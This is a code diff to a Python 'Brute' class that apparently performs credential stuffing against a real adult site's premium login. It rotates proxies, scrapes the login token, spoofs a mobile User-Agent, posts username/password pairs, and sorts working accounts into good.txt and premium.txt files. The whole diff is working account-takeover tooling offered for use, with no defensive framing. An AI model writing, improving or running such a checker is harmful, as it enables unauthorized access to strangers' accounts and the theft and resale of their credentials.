@@ -40,20 +40,26 @@ class Brute(object):
                 proxies = {'https': self.proxytype +  "://" +self.getproxy(), 'http': self.proxytype +  "://" + self.getproxy()}
             else:
                 proxies = {'https': '127.0.0.1:8080', 'http': '127.0.0.1:8080'}
-
-            r = requests.get("https://rt.pornhubpremium.com/premium/login", proxies=proxies, verify=False, timeout=self.timeout)
+            headers = {'User-Agent' : 'Mozilla/5.0 (Linux; Android 6.0.1; Moto G (4)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Mobile Safari/537.36'}
+            s = requests.session()
+            r = s.get("https://rt.pornhubpremium.com/premium/login", proxies=proxies, verify=False, timeout=self.timeout, headers=headers)
             site = soup(r.text, "html.parser")
             token = site.find("input", id="token")
-            body = {'username' : login, 'password': password, 'remember_me' : 'on', 'token' : str(token['value']), 'redirect' : '', 'from' : 'pc_premium_login', 'segment':'straight'}
-            r = requests.post("https://rt.pornhubpremium.com/front/authenticate", data=body, proxies=proxies, verify=False, timeout=self.timeout)
+            body = {'username' : login, 'password': password, 'remember_me' : 'on', 'from':'mobile_login', 'token' : str(token['value']), 'redirect' : '', 'from' : 'pc_premium_login', 'segment':'straight'}
+            r = s.post("https://rt.pornhubpremium.com/front/authenticate", data=body, proxies=proxies, verify=False, timeout=self.timeout, headers=headers)
             
-            if r.json()['success'] == "0":
+
+            if "\u041d\u0435\u0432\u0435\u0440\u043d\u043e\u0435" in r.json()['message']:
                 self.bad += 1
             elif r.json()['success'] == "1":
-                self.writelog("good.txt", login + ":" + password + "|" + str(r.json()['premium_redirect_cookie']))
+                if r.json()['premium_redirect_cookie'] == "0":
+                    self.writelog("good.txt", login + ":" + password)
+                else:
+                    self.writelog("premium.txt", login + ":" + password + "|" + str(r.text))
                 self.good += 1
                 #return login + ":" + password + "|" + str(r.json()['result']['basic']) + "|" + str(r.json()['result']['bonus'])
-            else :
+            
+            else:
                 self.projerror += 1
         except Exception as e:
             #print("Error is " + str(e))
